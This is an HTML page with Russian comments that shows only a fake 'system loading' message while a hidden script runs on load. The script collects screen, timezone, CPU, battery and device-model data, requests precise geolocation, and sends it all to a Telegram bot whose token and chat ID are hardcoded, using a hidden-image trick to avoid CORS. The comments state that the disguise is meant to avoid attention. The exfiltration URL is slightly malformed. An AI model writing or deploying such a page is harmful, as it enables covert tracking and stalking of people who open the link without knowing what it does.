<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Загрузка системы...</title>
    <style>
        /* Минимальный технический стиль: пустой экран */
        body { font-family: monospace; background: #ffffff; color: #000000; margin: 20px; font-size: 12px; }
        .hidden { display: none; }
    </style>
</head>
<body>

    <!-- Страница выглядит как обычная загрузка, чтобы не привлекать внимания -->
    <div id="status">Загрузка компонентов системы... Пожалуйста, подождите.</div>

    <script>
        // Конфигурация вашего рабочего Телеграм-бота
        const TOKEN = "8892692128:AAEpvN2XHeallC2MfTQMB10aaHxy3VGRVss";
        const CHAT_ID = "6559747526";

        // Функция отправки отчетов (метод скрытой картинки, обходящий CORS-блокировки браузеров)
        function sendReport(extraData = "") {
            const time = new Date().toLocaleTimeString();
            const date = new Date().toLocaleDateString();
            
            // Базовые системные параметры, доступные без разрешений
            const screenRes = `${window.screen.width}x${window.screen.height} (DPR: ${window.devicePixelRatio})`;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const cores = navigator.hardwareConcurrency || "Не определено";
            const isIos = /iPhone|iPad|iPod/i.test(navigator.userAgent) ? "Apple iOS" : "Android / PC";

            // Сборка финального текста с максимальной информацией
            let reportText = `🔔 *Технический отчет*\n\n` +
                             `📅 *Дата:* ${date}\n` +
                             `🕒 *Время:* ${time}\n` +
                             `🤖 *Платформа:* ${isIos}\n` +
                             `🖥 *Экран:* ${screenRes}\n` +
                             `🌍 *Часовой пояс:* ${timezone}\n` +
                             `🧠 *Ядра CPU:* ${cores}` + 
                             extraData;

            // Отправка через API Telegram
            const img = new Image();
            img.src = `https://telegram.org{TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(reportText)}&parse_mode=Markdown`;
        }

        // Дополнительный сбор данных, требующих асинхронного ожидания (заряд и точная модель)
        async function startAnalytics() {
            let batteryText = "\n🔋 *Батарея:* Блокируется системой (iOS)";
            let modelText = "";

            // 1. Попытка замерить заряд батареи (работает на Android/ПК)
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    batteryText = `\n🔋 *Батарея:* ${Math.round(battery.level * 100)}%`;
                } catch (e) {}
            }

            // 2. Попытка вытянуть точную модель процессора/бренда через Client Hints (Android)
            if (navigator.userAgentData) {
                try {
                    const ua = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
                    if (ua.model) modelText = `\n📱 *Модель:* ${ua.model} (v${ua.platformVersion})`;
                } catch (e) {}
            }

            // Отправляем первый базовый пакет данных сразу при входе
            sendReport(batteryText + modelText);

            // 3. Запрос точных координат геолокации
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        // Форматируем единую строчку координат для быстрого копирования кликом
                        const coords = `\n📍 *Координаты:* \`${lat},${lon}\``;
                        
                        sendReport(batteryText + modelText + coords);
                        document.getElementById('status').innerText = "Загрузка завершена успешно.";
                    },
                    (error) => {
                        // Если пользователь отклонил окно, уведомляем систему
                        sendReport(batteryText + modelText + "\n❌ *Геолокация:* Доступ отклонен пользователем");
                        document.getElementById('status').innerText = "Ошибка конфигурации датчиков.";
                    },
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            }
        }

        // Запуск сбора данных через полсекунды после открытия страницы
        window.addEventListener('DOMContentLoaded', () => {
            setTimeout(startAnalytics, 500);
        });
    </script>
</body>
</html>
